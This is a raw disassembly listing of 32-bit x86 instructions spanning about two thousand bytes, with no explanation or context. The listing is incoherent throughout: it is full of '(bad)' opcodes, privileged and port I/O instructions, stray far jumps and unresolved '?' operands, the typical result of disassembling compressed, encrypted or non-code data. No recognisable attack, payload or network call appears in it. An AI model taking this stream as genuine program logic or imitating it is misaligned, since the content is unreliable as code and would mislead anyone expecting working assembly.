  4124be:	sub    edx,DWORD PTR [ecx+eax*4]
  4124c1:	shl    BYTE PTR [ebx-0x4ee40843],1
  4124c7:	and    DWORD PTR [ebx+0x17],esp
  4124ca:	cmp    al,0x53
  4124cc:	jecxz  0x4124ac
  4124ce:	loopne 0x41251b
  4124d0:	(bad)  
  4124d1:	sub    eax,0x33a9e8b3
  4124d6:	sbb    BYTE PTR [ebp+0x7a493069],al
  4124dc:	mov    ebp,0xba440b1e
  4124e1:	xor    BYTE PTR [ebp-0x26358f31],ah
  4124e7:	pop    ecx
  4124e8:	inc    edx
  4124e9:	aaa    
  4124ea:	cld    
  4124eb:	mov    ?,edx
  4124ed:	push   ecx
  4124ee:	cli    
  4124ef:	pop    esi
  4124f0:	fs lods al,BYTE PTR es:[esi]
  4124f3:	aaa    
  4124f4:	repnz mov dh,0xdd
  4124f7:	ja     0x4124b8
  4124f9:	aas    
  4124fa:	add    dl,bl
  4124fc:	das    
  4124fd:	retf   0x89
  412500:	out    dx,al
  412501:	dec    esi
  412502:	sub    edi,DWORD PTR [edi]
  412504:	mov    edi,0xf5cfa79f
  412509:	je     0x4124dc
  41250b:	or     DWORD PTR [edi-0x2e634887],ecx
  412511:	hlt    
  412512:	jmp    0x4124c9
  412514:	daa    
  412515:	imul   ebp,DWORD PTR [ecx-0x6dee97f5],0xfac1d3b
  41251f:	outs   dx,DWORD PTR ds:[esi]
  412520:	inc    eax
  412521:	fsubp  st(1),st
  412523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412524:	mov    ecx,0x4934754b
  412529:	xchg   esp,eax
  41252a:	pop    es
  41252b:	pop    edi
  41252c:	jge    0x412599
  41252e:	adc    dh,bl
  412530:	sbb    al,0xd
  412532:	ret    0xe396
  412535:	lock ins DWORD PTR es:[edi],dx
  412537:	neg    edx
  412539:	test   BYTE PTR [ecx+0x31ecad39],ah
  41253f:	sbb    eax,0x3072626c
  412544:	gs jb  0x4125be
  412547:	stos   BYTE PTR es:[edi],al
  412548:	jg     0x412520
  41254a:	sub    al,0x6c
  41254c:	pop    eax
  41254d:	idiv   DWORD PTR [esi+0x1e]
  412550:	mov    al,0xa9
  412552:	aad    0x3
  412554:	js     0x41255f
  412556:	xchg   ebx,eax
  412557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412558:	popa   
  412559:	cmp    bh,dh
  41255b:	cmp    esp,DWORD PTR [ebx-0x5787af9]
  412561:	jo     0x41254c
  412563:	rcr    BYTE PTR [edx],1
  412565:	fwait
  412566:	(bad)  
  412567:	dec    edx
  412568:	icebp  
  412569:	loopne 0x4125c1
  41256b:	fadd   QWORD PTR [eax+ebx*8-0x201f54b2]
  412572:	jae    0x4125b2
  412574:	(bad)  
  412575:	rcr    BYTE PTR [esi+0x8389427],0x98
  41257c:	(bad)
  41257f:	call   DWORD PTR [si+0xf]
  412583:	xor    al,0xac
  412585:	add    al,0x3f
  412587:	push   0x12
  412589:	repnz hlt 
  41258b:	ins    BYTE PTR es:[edi],dx
  41258c:	sub    eax,DWORD PTR [esi-0x2b274fa9]
  412592:	push   0xffffffca
  412594:	imul   esp,eax,0x5a
  412597:	jmp    0x412586
  412599:	add    cl,ch
  41259b:	xor    BYTE PTR ds:0x77ca1239,0x25
  4125a2:	iret   
  4125a3:	mov    esp,0x8388d9da
  4125a8:	ret    0xee86
  4125ab:	inc    esi
  4125ac:	inc    eax
  4125ad:	mov    eax,ds:0x7018e7ec
  4125b2:	mov    eax,DWORD PTR [ebx-0x4d]
  4125b5:	mov    ecx,0x812c854d
  4125ba:	mov    bh,0x64
  4125bc:	clc    
  4125bd:	(bad)  
  4125be:	mov    ds:0x9c759539,al
  4125c3:	cld    
  4125c4:	xor    bl,BYTE PTR [ebx]
  4125c6:	ja     0x4125ae
  4125c8:	(bad)  [ebp-0x6c]
  4125cb:	adc    BYTE PTR [esi+ebp*8],al
  4125ce:	xchg   ebp,eax
  4125cf:	inc    ecx
  4125d0:	add    ebx,edx
  4125d2:	cli    
  4125d3:	test   dl,bl
  4125d5:	jecxz  0x4125e0
  4125d7:	mov    ebp,0x9da8a5f8
  4125dc:	std    
  4125dd:	push   esi
  4125de:	pop    es
  4125df:	xor    DWORD PTR [esi],ebx
  4125e1:	pop    esi
  4125e2:	(bad)  
  4125e3:	jg     0x412572
  4125e5:	enter  0xb0d6,0x14
  4125e9:	gs push ebx
  4125eb:	add    DWORD PTR [ebp+0x65],edx
  4125ee:	pop    edx
  4125ef:	nop
  4125f0:	fcomi  st,st(5)
  4125f2:	xchg   edi,eax
  4125f3:	mov    ch,0x49
  4125f5:	sti    
  4125f6:	cli    
  4125f7:	(bad)  
  4125f8:	sti    
  4125f9:	mov    cl,0x88
  4125fb:	(bad)
  4125fe:	outs   dx,BYTE PTR fs:[esi]
  412600:	cdq    
  412601:	fild   DWORD PTR [edx]
  412603:	sub    eax,0xd862b7b0
  412608:	fidivr WORD PTR [edi+0x628fd45d]
  41260e:	dec    ebp
  41260f:	push   ebp
  412610:	add    eax,0x457f5f43
  412615:	mov    edx,0x256c1a89
  41261a:	sbb    eax,0x3e12abdc
  41261f:	sbb    BYTE PTR [ecx-0x51db1891],0x66
  412626:	pop    ebp
  412627:	aaa    
  412628:	imul   edi,DWORD PTR [ebx],0xfffffff2
  41262b:	rcl    DWORD PTR ds:0xaeaa6de0,0x48
  412632:	xor    BYTE PTR [esp+eax*2+0x57a8fe07],bl
  412639:	test   al,0xd1
  41263b:	ret    0xe279
  41263e:	add    eax,0x1ca068ce
  412643:	ds pop eax
  412645:	sub    ebx,DWORD PTR [esi+0x37714986]
  41264b:	mov    eax,esp
  41264d:	or     al,0x61
  41264f:	xchg   ecx,eax
  412650:	cwde   
  412651:	and    al,0x68
  412653:	into   
  412654:	pushf  
  412655:	fadd   QWORD PTR ds:0xcccc8c12
  41265b:	fld    TBYTE PTR [eax+0x59]
  41265e:	push   edi
  41265f:	push   0xffffffa8
  412661:	aad    0x1f
  412663:	mov    ebp,esi
  412665:	inc    edx
  412666:	test   DWORD PTR [esi+0x2f],ebp
  412669:	cwde   
  41266a:	js     0x412658
  41266c:	shl    DWORD PTR [edx+0x1eb90a5f],1
  412672:	cmp    esi,DWORD PTR [ebx+0x532c4617]
  412678:	mov    ebp,0xa82f3083
  41267d:	cmc    
  41267e:	stos   BYTE PTR es:[edi],al
  41267f:	mov    esi,0x3b2443b7
  412684:	mov    edx,edi
  412686:	mov    eax,ds:0xb788a96d
  41268b:	imul   ebx,DWORD PTR [ecx],0xffffffe3
  41268e:	les    edx,FWORD PTR [ebp+edi*2-0x72]
  412692:	sti    
  412693:	jge    0x4126f2
  412695:	inc    edi
  412696:	mov    cl,BYTE PTR [edx+0x1c]
  412699:	bound  esp,QWORD PTR [edi-0xaac867d]
  41269f:	cli    
  4126a0:	add    BYTE PTR [edi-0x75],cl
  4126a3:	pop    es
  4126a4:	or     BYTE PTR [esi+0x6c],bl
  4126a7:	scas   al,BYTE PTR es:[edi]
  4126a8:	cmp    al,ch
  4126aa:	ret    
  4126ab:	mov    ch,0x82
  4126ad:	cmp    esi,DWORD PTR [edx+ecx*2+0x5909dfa6]
  4126b4:	dec    ecx
  4126b5:	push   ecx
  4126b6:	mov    ch,0xc8
  4126b8:	pop    esp
  4126b9:	sbb    cl,BYTE PTR [ebp-0xd35be1a]
  4126bf:	in     al,0x9
  4126c1:	retf   
  4126c2:	mov    dl,0x35
  4126c4:	adc    esp,DWORD PTR [esi-0x22a30538]
  4126ca:	push   0xd
  4126cc:	xor    DWORD PTR [edi],0xc6bb0220
  4126d2:	fwait
  4126d3:	test   BYTE PTR [esi+0x6fbbedbd],al
  4126d9:	sbb    al,al
  4126db:	in     al,dx
  4126dc:	add    BYTE PTR [eax],bh
  4126de:	push   edi
  4126df:	fiadd  WORD PTR [ecx-0x757c5fa2]
  4126e5:	push   ecx
  4126e6:	jno    0x41272d
  4126e8:	xchg   edi,eax
  4126ea:	repz icebp 
  4126ec:	scas   eax,DWORD PTR es:[edi]
  4126ed:	sub    eax,DWORD PTR [ebx-0x516d39f8]
  4126f3:	jmp    0x2ef:0x1a6616bf
  4126fa:	mov    ecx,0x91c61465
  4126ff:	jno    0x4126ac
  412701:	pop    ds
  412702:	and    bh,BYTE PTR [edi+ecx*1-0x27]
  412706:	outs   dx,DWORD PTR ds:[esi]
  412707:	into   
  412708:	arpl   sp,si
  41270a:	dec    ebx
  41270b:	xchg   edx,eax
  41270c:	ror    BYTE PTR [ebp+ebx*2-0x56],1
  412710:	idiv   ebx
  412712:	adc    esp,esp
  412714:	es push ecx
  412716:	loopne 0x412722
  412718:	popf   
  412719:	dec    edx
  41271a:	cmc    
  41271b:	fisubr WORD PTR [eax-0x7b062111]
  412721:	mov    BYTE PTR [edi+0x4d061b28],al
  412727:	arpl   WORD PTR [ecx-0x4a],di
  41272a:	jno    0x4126fb
  41272c:	lds    ebx,FWORD PTR [esi-0x407cf23]
  412732:	and    BYTE PTR [edx+0x7b],0xa6
  412736:	lods   eax,DWORD PTR ds:[esi]
  412737:	xchg   edx,eax
  412738:	mov    esi,0x19e01dbc
  41273d:	xor    ah,BYTE PTR [ebx-0x6a]
  412740:	cdq    
  412741:	pop    edx
  412742:	adc    ebx,DWORD PTR [edx-0x2c35f121]
  412748:	mov    ds:0xed5670dd,eax
  41274d:	push   edx
  41274e:	inc    esp
  41274f:	aas    
  412750:	xchg   BYTE PTR [ecx-0x1b],cl
  412753:	test   al,0xea
  412755:	jb     0x412760
  412757:	pop    edi
  412758:	pop    edi
  412759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41275a:	retf   0x1334
  41275d:	and    eax,0xc5fd2e9
  412762:	push   ebx
  412763:	pop    ebp
  412764:	cmp    bh,BYTE PTR [esi]
  412766:	cmp    eax,0xebc392c5
  41276b:	daa    
  41276c:	fsub   st(7),st
  41276e:	mov    ds:0x6788bb68,eax
  412773:	and    esp,DWORD PTR [eax+0x3f]
  412776:	or     DWORD PTR [esi],0x6f561888
  41277c:	pop    ds
  41277d:	mov    ds:0x3b3a119f,eax
  412782:	je     0x4127a5
  412784:	sbb    esi,DWORD PTR [edi+0x58]
  412787:	pop    edx
  412788:	cli    
  412789:	dec    ecx
  41278a:	cmp    cl,BYTE PTR [edi-0x62]
  41278d:	mov    cl,0x2e
  41278f:	fadd   DWORD PTR [ebp+0x23]
  412792:	ja     0x412806
  412794:	push   eax
  412795:	ret    0xf331
  412798:	jg     0x4127c8
  41279a:	aaa    
  41279b:	es popf 
  41279d:	(bad)  
  41279e:	(bad)  
  41279f:	in     eax,0xc4
  4127a1:	outs   dx,DWORD PTR ds:[esi]
  4127a2:	push   ebx
  4127a3:	jne    0x412808
  4127a5:	aaa    
  4127a6:	push   es
  4127a7:	pop    es
  4127a8:	xor    eax,0xce069df5
  4127ad:	add    eax,0x74f47ce7
  4127b2:	mov    ah,0x93
  4127b4:	pusha  
  4127b5:	mov    dh,BYTE PTR [edx-0x708b4e7a]
  4127bb:	mov    esi,0xfa2d08fb
  4127c0:	push   cs
  4127c1:	jmp    0x443ac3d1
  4127c6:	jle    0x4127ce
  4127c8:	mov    edi,0x3f3aaab2
  4127cd:	mov    ebp,0x4f209687
  4127d2:	add    edi,edx
  4127d4:	mov    DWORD PTR [ebp+0x60],edi
  4127d7:	pushf  
  4127d8:	and    eax,0x2c9560e5
  4127dd:	ret    
  4127de:	xor    eax,0x789fba2f
  4127e3:	les    edi,FWORD PTR [edi+0x6bfe8102]
  4127e9:	mov    WORD PTR [esi-0x25],ss
  4127ec:	in     al,dx
  4127ed:	or     cl,BYTE PTR [ebx+0x7cf33ebb]
  4127f3:	sbb    cl,dl
  4127f5:	div    ch
  4127f7:	fwait
  4127f8:	or     DWORD PTR [ebx+0x4c884d9b],0xe523a459
  412802:	xchg   esi,eax
  412803:	mul    BYTE PTR [edx*1+0x167ebc3b]
  41280a:	in     al,0x6c
  41280c:	push   cs
  41280d:	aas    
  41280e:	outs   dx,DWORD PTR cs:[esi]
  412810:	xor    eax,0x74aa008a
  412815:	xchg   edx,eax
  412816:	adc    eax,0x4a07b14e
  41281b:	shl    cl,0x3b
  41281e:	sti    
  41281f:	mov    dl,0x64
  412821:	fcomp  DWORD PTR [ecx]
  412823:	push   ebp
  412824:	or     eax,0x7db3823e
  412829:	in     eax,dx
  41282a:	rcl    DWORD PTR [edi-0x8],cl
  41282d:	mov    al,0xa0
  41282f:	out    dx,al
  412830:	xchg   esi,eax
  412831:	xchg   ebp,eax
  412832:	lock out dx,al
  412834:	xchg   ecx,eax
  412835:	sahf   
  412836:	jge    0x4128b6
  412838:	data16 loop 0x4128a4
  41283b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41283c:	inc    edi
  41283d:	adc    al,0xc0
  41283f:	data16 jl 0x412884
  412842:	in     eax,dx
  412843:	dec    ebp
  412844:	jmp    0x520c:0xd586181
  41284b:	push   cs
  41284c:	bnd jl 0x412827
  41284f:	push   ds
  412850:	pop    ss
  412851:	scas   al,BYTE PTR es:[edi]
  412852:	pop    ebp
  412853:	cs or  eax,0x3239f58f
  412859:	inc    eax
  41285a:	jp     0x4128b2
  41285c:	mov    dh,0x80
  41285e:	ficomp WORD PTR [ebx-0x1cba7e46]
  412864:	dec    edx
  412865:	daa    
  412866:	pop    es
  412867:	adc    eax,0x40b1066f
  41286c:	je     0x4128e1
  41286e:	mov    DWORD PTR [ecx+edx*8+0x13ccc971],ebp
  412875:	inc    esi
  412876:	movups XMMWORD PTR [ebx+edi*2+0x412bf09e],xmm1
  41287e:	fwait
  41287f:	bound  esi,QWORD PTR [edi-0x15863813]
  412885:	mov    ebx,0xc68eb3c4
  41288a:	cwde   
  41288b:	inc    edx
  41288c:	arpl   ax,bx
  41288e:	pusha  
  41288f:	mov    ch,0x27
  412891:	add    al,0xb6
  412893:	jmp    0x412876
  412895:	jbe    0x412881
  412897:	xchg   BYTE PTR [esi-0x2d],bh
  41289a:	push   edx
  41289b:	les    esi,FWORD PTR [ecx-0x21]
  41289e:	inc    esi
  41289f:	add    BYTE PTR [edi+0x1d2826c],ch
  4128a5:	mov    dl,0x2e
  4128a7:	ds stos BYTE PTR es:[edi],al
  4128a9:	dec    edi
  4128aa:	pop    esi
  4128ab:	sub    al,0x18
  4128ad:	mov    BYTE PTR [edi+0x55],bl
  4128b0:	inc    edi
  4128b1:	jge    0x4128ee
  4128b3:	repnz add BYTE PTR [esi],dh
  4128b6:	mov    bh,0x2d
  4128b8:	xchg   ebx,eax
  4128b9:	or     ebx,edx
  4128bb:	pop    ds
  4128bc:	and    cl,BYTE PTR [esi+edi*4-0x6e]
  4128c0:	add    al,0x75
  4128c2:	pusha  
  4128c3:	addr16 inc esi
  4128c5:	inc    edx
  4128c6:	mov    dh,0x5e
  4128c8:	adc    DWORD PTR [esi+0x4d],esi
  4128cb:	pop    ebp
  4128cc:	shl    DWORD PTR [esi],1
  4128ce:	adc    al,0x8
  4128d0:	jmp    DWORD PTR [ebp-0x45dbfafc]
  4128d6:	pop    es
  4128d7:	scas   al,BYTE PTR es:[edi]
  4128d8:	pop    ds
  4128d9:	es pop esi
  4128db:	cmp    BYTE PTR [ecx+0x7d],al
  4128de:	loopne 0x4128a7
  4128e0:	xchg   DWORD PTR [ebx-0x2b],esi
  4128e3:	push   ecx
  4128e4:	push   ss
  4128e5:	xchg   edi,eax
  4128e6:	lahf   
  4128e7:	or     bl,BYTE PTR [ebp-0x21]
  4128ea:	adc    eax,0x7e77c578
  4128ef:	add    DWORD PTR [edi+0x74],edi
  4128f2:	mov    al,ds:0x97a36f7f
  4128f7:	xchg   DWORD PTR [eax-0x59],ecx
  4128fa:	into   
  4128fb:	add    BYTE PTR [esi],al
  4128fd:	stos   BYTE PTR es:[edi],al
  4128fe:	cmp    al,0x8
  412900:	les    ebp,FWORD PTR [eax]
  412902:	es mov dh,0x33
  412905:	or     al,0xf4
  412907:	inc    eax
  412908:	pop    ds
  412909:	outs   dx,BYTE PTR ds:[esi]
  41290a:	sbb    DWORD PTR [edi-0x1e],0x6a
  41290e:	cmp    BYTE PTR [ebx+0x3a],dl
  412911:	jge    0x4128c6
  412913:	sub    bl,ah
  412915:	repnz cmp eax,0x318b30e5
  41291b:	cmp    al,ch
  41291d:	pop    esi
  41291e:	fldenv [ecx+ebp*4-0x34]
  412922:	pop    ds
  412923:	sub    esp,DWORD PTR [ecx]
  412925:	mov    al,ds:0x18d903a5
  41292a:	cli    
  41292b:	add    ebp,ebx
  41292d:	ret    
  41292e:	mov    DWORD PTR [esi-0xa],esp
  412931:	xchg   edi,eax
  412932:	adc    DWORD PTR [eax-0x60862a85],ecx
  412938:	jae    0x41294d
  41293a:	cmp    DWORD PTR [esi-0x39],edx
  41293d:	mov    ebp,0xa3b83f86
  412942:	fiadd  WORD PTR [ebx-0x7ada061]
  412948:	mov    ebx,0xf5830e74
  41294d:	mov    cl,0x33
  41294f:	mov    dh,0xc5
  412951:	mov    eax,0xb75a0061
  412956:	test   al,0x1c
  412958:	jno    0x412974
  41295a:	push   0xffffffa3
  41295c:	imul   ebp,DWORD PTR [eax],0x48
  41295f:	sar    DWORD PTR [ebx+0x2f],1
  412962:	sbb    BYTE PTR [eax+ebx*8],cl
  412965:	std    
  412966:	dec    edx
  412967:	imul   eax,DWORD PTR ds:0x1a3c9a54,0x38
  41296e:	push   es
  41296f:	fld    DWORD PTR [eax]
  412971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412972:	add    al,0xf6
  412974:	scas   al,BYTE PTR es:[edi]
  412975:	jmp    0x412928
  412977:	(bad)  
  412979:	pop    ebx
  41297a:	mul    dl
  41297c:	repz call DWORD PTR [edx+eax*4-0x24]
  412981:	ret    0x54d7
  412984:	int3   
  412985:	cmp    al,0x81
  412987:	cli    
  412988:	inc    edi
  412989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41298a:	rcl    BYTE PTR ds:0x7436e2e2,1
  412990:	adc    ebp,DWORD PTR [esi-0x408a3400]
  412996:	push   esi
  412997:	sub    eax,0xfe0c5b53
  41299c:	popf   
  41299d:	inc    edi
  41299e:	cmp    al,0x38
  4129a0:	add    BYTE PTR [ecx+0x3a],0x8e
  4129a4:	int3   
  4129a5:	dec    esi
  4129a6:	xchg   esi,eax
  4129a7:	out    0x2,eax
  4129a9:	mov    ds:0x24d1b39b,eax
  4129ae:	inc    esp
  4129af:	sbb    eax,0x7ee99dfc
  4129b4:	or     eax,0xbe13c7e1
  4129b9:	mov    bl,0xa6
  4129bb:	js     0x412a18
  4129bd:	mov    edi,DWORD PTR [ebp-0x2674de6b]
  4129c3:	dec    eax
  4129c4:	out    dx,al
  4129c5:	add    ecx,DWORD PTR [ebx+0x45ecf2d4]
  4129cb:	ds sub esi,esi
  4129ce:	hlt    
  4129cf:	push   ebx
  4129d0:	adc    ecx,DWORD PTR [eax-0x75f5750f]
  4129d6:	(bad)  
  4129d7:	stos   BYTE PTR es:[edi],al
  4129d8:	sbb    al,0xed
  4129da:	mov    ?,WORD PTR cs:[edx+0x5b]
  4129de:	das    
  4129df:	push   eax
  4129e0:	add    ebp,DWORD PTR [eax]
  4129e2:	xor    dh,BYTE PTR [esi-0x789dc143]
  4129e8:	cs sbb DWORD PTR fs:[ebp+ecx*8-0x4f6e0e86],edx
  4129f1:	mov    ecx,0x824a0a35
  4129f6:	xor    DWORD PTR [edi-0x7ee15664],edi
  4129fc:	lock mov ah,0x64
  4129ff:	icebp  
  412a00:	cdq    
  412a01:	stc    
  412a02:	call   0xd7353fb1
  412a07:	aad    0xd1
  412a09:	mov    dh,0x1a
  412a0b:	daa    
  412a0c:	loopne 0x412a3b
  412a0e:	xchg   esi,eax
  412a0f:	mov    ds:0x9f89e079,al
  412a14:	jmp    0x4d4c:0xc619cfc1
  412a1b:	pusha  
  412a1c:	fidivr DWORD PTR [edx-0xd9d06f3]
  412a22:	pop    eax
  412a23:	pop    edi
  412a24:	xor    al,0x33
  412a26:	and    bh,ah
  412a28:	mov    ah,0xeb
  412a2a:	retf   0x596a
  412a2d:	fmul   st(1),st
  412a2f:	(bad)  
  412a30:	jnp    0x4129b5
  412a32:	inc    edi
  412a33:	xlat   BYTE PTR ds:[ebx]
  412a34:	rol    DWORD PTR [ecx+0x9],cl
  412a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a38:	jnp    0x412a97
  412a3a:	aad    0x47
  412a3c:	mov    DWORD PTR [ecx],esi
  412a3e:	add    bh,BYTE PTR [eax]
  412a40:	push   0x57
  412a42:	xchg   ebp,eax
  412a43:	mov    esp,0x7fa19e97
  412a48:	jnp    0x4129e4
  412a4a:	fisubr DWORD PTR [ecx-0x1c]
  412a4d:	mov    esi,0x45b565ad
  412a52:	pop    esp
  412a53:	xchg   ebx,esi
  412a55:	mov    edx,0xbe19be3b
  412a5a:	pop    es
  412a5b:	iret   
  412a5c:	aam    0x29
  412a5e:	mov    cs,WORD PTR [ebx+0x3fbd126e]
  412a64:	popa   
  412a65:	arpl   WORD PTR [esp+ecx*1-0x64648892],sp
  412a6c:	jmp    0xc76e:0xdeb959c6
  412a73:	xchg   edi,eax
  412a74:	addr16 out 0xba,al
  412a77:	stos   BYTE PTR es:[edi],al
  412a78:	cmp    dl,BYTE PTR [edx+ecx*2]
  412a7b:	imul   edi,DWORD PTR [edi+0x76fc8f34],0x18
  412a82:	and    DWORD PTR [eax+0x7c],ecx
  412a85:	imul   eax,esp,0x5c
  412a88:	out    0x60,al
  412a8a:	sbb    eax,0xa2d8e6fa
  412a8f:	mov    BYTE PTR [edx+0x6643d96d],ch
  412a95:	push   ebx
  412a96:	cvtpi2ps xmm1,mm4
  412a99:	cs push eax
  412a9b:	push   esp
  412a9c:	mov    eax,ds:0xcd6454c0
  412aa1:	sbb    eax,0xd55c499e
  412aa6:	add    edi,DWORD PTR [edx+0x77857e84]
  412aac:	(bad)  
  412aad:	push   ds
  412aae:	neg    DWORD PTR [ebp-0x67]
  412ab1:	jo     0x412a3b
  412ab3:	popa   
  412ab4:	pop    edx
  412ab5:	pop    esi
  412ab6:	imul   ebp,DWORD PTR ds:0x61236f1b,0xb19883d6
  412ac0:	(bad)  
  412ac1:	leave  
  412ac2:	fist   WORD PTR [eax-0x69]
  412ac5:	mov    ebp,0x4a44e3d9
  412aca:	test   DWORD PTR [edx+0xebd8f84],esi
  412ad0:	sub    eax,0x2c737306
  412ad5:	add    eax,DWORD PTR [edi]
  412ad7:	mov    ebx,0x602da71a
  412adc:	jnp    0x412a76
  412ade:	or     DWORD PTR [ebx+0x6696620c],ebp
  412ae4:	adc    al,0xfc
  412ae6:	mov    ds:0x879c0e28,eax
  412aeb:	inc    eax
  412aec:	or     esp,0x148056af
  412af2:	mov    ds:0x31f5872f,al
  412af7:	repz and BYTE PTR [esp+ebp*1-0x16a82168],bl
  412aff:	or     al,0xca
  412b01:	or     BYTE PTR [ebx-0x2b],bh
  412b04:	std    
  412b05:	std    
  412b06:	imul   ebx,DWORD PTR [eax-0x55],0x308aceae
  412b0d:	cmp    al,0x21
  412b0f:	xchg   ecx,eax
  412b10:	pop    ecx
  412b11:	aad    0xc1
  412b13:	cwde   
  412b14:	test   eax,0xd7a54ed
  412b19:	jmp    0x5db2:0x6f749f1f
  412b20:	ss jmp 0x412aba
  412b23:	or     BYTE PTR [ecx+0x542b4ff9],ch
  412b29:	repz jle 0x412b9b
  412b2c:	js     0x412b06
  412b2e:	lea    esp,[eax+ebx*4+0x58]
  412b32:	or     eax,0xe36588ac
  412b37:	cmc    
  412b38:	hlt    
  412b39:	xor    DWORD PTR [ebx-0x6f],eax
  412b3c:	xchg   BYTE PTR [ebp-0x7dcaa541],dl
  412b42:	sti    
  412b43:	cmp    DWORD PTR [ebx],ecx
  412b45:	arpl   WORD PTR ds:0x62fdade2,di
  412b4b:	sub    BYTE PTR [esi],bl
  412b4d:	cld    
  412b4e:	xchg   edx,eax
  412b4f:	xlat   BYTE PTR ds:[ebx]
  412b50:	sbb    ecx,DWORD PTR [edx-0x60]
  412b53:	das    
  412b54:	lea    ebp,[ecx]
  412b56:	int3   
  412b57:	into   
  412b58:	push   0xed9ba661
  412b5d:	add    BYTE PTR [ebx+0x10ad4f01],dh
  412b63:	pushf  
  412b64:	popf   
  412b65:	es jle 0x412bd8
  412b68:	mov    esi,DWORD PTR [eax+ebp*1]
  412b6b:	mov    esi,0xa6f310f4
  412b70:	mov    esp,0x8c1f9cd5
  412b75:	shr    edx,1
  412b77:	mov    bl,0x38
  412b79:	jle    0x412bf2
  412b7b:	xchg   BYTE PTR [edx+ebx*1],bl
  412b7e:	adc    DWORD PTR [edx+0x5730ebf8],esi
  412b84:	rol    bl,0xaf
  412b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b88:	aas    
  412b89:	inc    edi
  412b8a:	sbb    al,0x96
  412b8c:	dec    esi
  412b8d:	sub    DWORD PTR [ebp+0x4e],esp
  412b90:	popf   
  412b91:	jecxz  0x412be9
  412b93:	mov    WORD PTR [ebx-0x209dab8f],es
  412b99:	mov    WORD PTR [ebx],ss
  412b9b:	sahf   
  412b9c:	push   cs
  412b9d:	retf   
  412b9e:	pop    ebx
  412b9f:	and    DWORD PTR ss:[eax+0x4e],0xffffffd7
  412ba4:	popf   
  412ba5:	xchg   esp,eax
  412ba6:	mov    dh,0x80
  412ba8:	cmp    eax,0xb792e8ff
  412bad:	jbe    0x412b9d
  412baf:	mov    ch,0x42
  412bb1:	mov    al,0xbd
  412bb3:	mov    edi,0x73604957
  412bb8:	fimul  DWORD PTR [edx+0x3649f3d]
  412bbe:	pop    ebp
  412bbf:	cli    
  412bc0:	in     al,0x17
  412bc2:	loope  0x412b6c
  412bc4:	imul   ecx,DWORD PTR [ebx+0x9],0xffffff86
  412bc8:	(bad)  
  412bc9:	mov    ebx,0xdf2da219
  412bce:	and    al,0x52
  412bd0:	jbe    0x412b85
  412bd2:	and    DWORD PTR [eax-0x3a],0xfffffffe
  412bd6:	out    0xf,eax
  412bd8:	out    0xa4,eax
  412bda:	add    BYTE PTR [eax+edi*8+0x3a],dh
  412bde:	mov    ebp,0x58568cf2
  412be3:	mov    ebp,0x3f2236f2
  412be8:	ucomiss xmm2,DWORD PTR [ebx+eiz*8]
  412bec:	lahf   
  412bed:	and    BYTE PTR gs:[edi+edi*1-0x4f5acc98],dh
  412bf5:	pop    edi
  412bf6:	inc    edi
  412bf7:	test   BYTE PTR [eax-0x792317dd],dl
  412bfd:	rcr    DWORD PTR [edx-0x4ad013e8],cl
  412c03:	cmp    eax,0xce68b023
  412c09:	cld    
  412c0a:	fadd   QWORD PTR [ecx]
  412c0c:	mov    bl,0x11
  412c0e:	(bad)  
  412c10:	lods   al,BYTE PTR ds:[esi]
  412c11:	adc    ch,BYTE PTR [edx-0x2f3b2fb2]
  412c17:	(bad)
  412c1a:	or     ecx,DWORD PTR [ecx]
  412c1c:	stos   DWORD PTR es:[edi],eax
  412c1d:	rol    BYTE PTR [ecx-0x26],0x3b
  412c21:	jbe    0x412baa
  412c23:	(bad)  
  412c24:	je     0x412bd5
  412c26:	(bad)  
  412c27:	mov    bl,0xe8
  412c29:	pop    ds
  412c2a:	jno    0x412bee
  412c2c:	aad    0x75
  412c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c2f:	mov    esi,0x8b677edd
  412c34:	lea    esi,[ecx]
  412c36:	cmc    
  412c37:	inc    ecx
  412c38:	mov    ch,0x1
  412c3a:	mov    bl,0x42
  412c3c:	inc    esp
  412c3d:	test   BYTE PTR [esi-0x73],0x35
  412c41:	clc    
  412c42:	xchg   DWORD PTR [esi+0x1c429bbe],ebp
  412c48:	xchg   ebp,eax
  412c49:	mov    WORD PTR [ebp-0x11],?
  412c4c:	mov    ebp,0xef3be949
  412c51:	mov    cl,0x50
  412c53:	or     al,0xd
  412c55:	jecxz  0x412ca5
  412c57:	stos   BYTE PTR es:[edi],al
  412c58:	fyl2xp1 
  412c5a:	lods   al,BYTE PTR ds:[esi]
  412c5b:	loopne 0x412ca6
  412c5d:	cs cmp ch,ah
  412c60:	mov    eax,DWORD PTR [eax+eiz*1]
  412c63:	lock out 0xcc,eax
  412c66:	sbb    dh,BYTE PTR [edx-0x293c20aa]
  412c6c:	lods   eax,DWORD PTR cs:[esi]
  412c6e:	pop    eax
  412c6f:	outs   dx,BYTE PTR ds:[esi]
  412c70:	fisttp QWORD PTR [edx]
  412c72:	cli    
  412c73:	les    edx,FWORD PTR [ebx]
  412c75:	pop    ebx
  412c76:	push   ebp
  412c77:	repnz stos DWORD PTR es:[edi],eax
  412c79:	cmp    al,BYTE PTR [ebp+0x26747298]
  412c7f:	xchg   edi,eax
  412c80:	pminsw mm0,QWORD PTR [ecx+0x28]
  412c84:	ds test eax,0x61689329
  412c8a:	(bad)  
  412c8b:	adc    eax,0x5b170767
  412c90:	sbb    al,0x2
  412c92:	jmp    0xaea4:0xd1aa9a21
  412c99:	mov    ds:0x501a140c,al
  412c9f:	push   cs
  412ca0:	leave  
  412ca1:	outs   dx,DWORD PTR ds:[esi]
  412ca2:	nop    DWORD PTR es:[edi]
  412ca6:	(bad)  
  412ca7:	mov    ebx,0x27d84dfc
  412cac:	push   cs
  412cad:	jne    0x412cfd
  412caf:	add    BYTE PTR [edx+0x678bd587],bh
  412cb5:	dec    ebp
  412cb6:	add    ebx,ecx
  412cb8:	jnp    0x412cbd
  412cba:	cmp    al,0xd7
  412cbc:	test   DWORD PTR [ebx+0x58],ecx
  412cbf:	mov    ds:0x9504816a,al
  412cc4:	or     al,0x5a
  412cc6:	and    BYTE PTR [esi+0x53],ch
  412cc9:	mov    ecx,0x84c6e5a0
